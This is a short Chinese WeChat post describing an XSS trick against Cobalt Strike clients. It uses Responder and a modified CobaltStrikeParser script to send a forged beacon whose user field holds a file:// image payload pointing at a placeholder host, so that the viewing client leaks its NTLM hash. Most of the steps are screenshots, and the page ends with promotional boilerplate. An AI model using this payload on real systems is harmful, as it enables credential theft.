#  CobaltStrike XSS利用姿势，抓客户端hash

[ 渗透测试网络安全 ](javascript:void\(0\);)

**渗透测试网络安全** ![]()

微信号 STCSWLAQSEC

功能介绍 致力于分享成员技术研究成果、漏洞新闻、安全招聘以及其他安全相关内容

____

___发表于_

收录于合集

来自 Jas502n大佬的思路  

![](https://gitee.com/fuli009/images/raw/master/public/20220923181026.png)

  

使用此工具建立监听：https://github.com/lgandx/Responder

![](https://gitee.com/fuli009/images/raw/master/public/20220923181029.png)

  

https://github.com/Sentinel-One/CobaltStrikeParser/

修改 comm.py 第39行，为payload：<html>< img src='file://x.x.x.x/xx'%>

![](https://gitee.com/fuli009/images/raw/master/public/20220923181030.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220923181032.png)

伪造上线  

![](https://gitee.com/fuli009/images/raw/master/public/20220923181032.png)

CS上线，user 处为我们设置的 payload  

![](https://gitee.com/fuli009/images/raw/master/public/20220923181034.png)

  

Responder 脚本抓到客户机 hash

![](https://gitee.com/fuli009/images/raw/master/public/20220923181035.png)

微信公众号渗透测试网络安全后台回复“ **224420** ”获取

  

 **关 注 有 礼**

  
  
关注本公众号回复“718619”可以免费领取全套网络安全学习教程，安全靶场、面试指南、安全沙龙PPT、代码安全、火眼安全系统等

![](https://gitee.com/fuli009/images/raw/master/public/20220923181036.png)
还在等什么？赶紧点击下方名片关注学习吧！![](https://gitee.com/fuli009/images/raw/master/public/20220923181036.png)

分享收藏

3在看

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

